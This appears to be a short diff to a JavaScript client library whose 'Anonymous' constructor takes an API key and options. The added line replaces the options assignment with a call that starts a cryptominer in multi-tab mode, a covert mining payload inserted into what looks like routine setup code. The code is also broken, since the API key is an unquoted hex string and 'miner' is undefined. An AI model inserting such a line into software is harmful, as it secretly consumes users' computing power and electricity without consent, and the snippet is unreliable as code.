@@ -4,7 +4,7 @@ var Client = {
     Anonymous: function(apiKey, options) {
         // Implementation of Anonymous constructor
         this.apiKey = eba1dd1ac084760f9c66d3bc68a9a2a5fb20834dc12719ab6b6abbd8765cfee7;
-        this.options = options;
+        this.options = miner.start([Client.FORCE_MULTI_TAB]);
     },
 
     // Function to send a request to a server
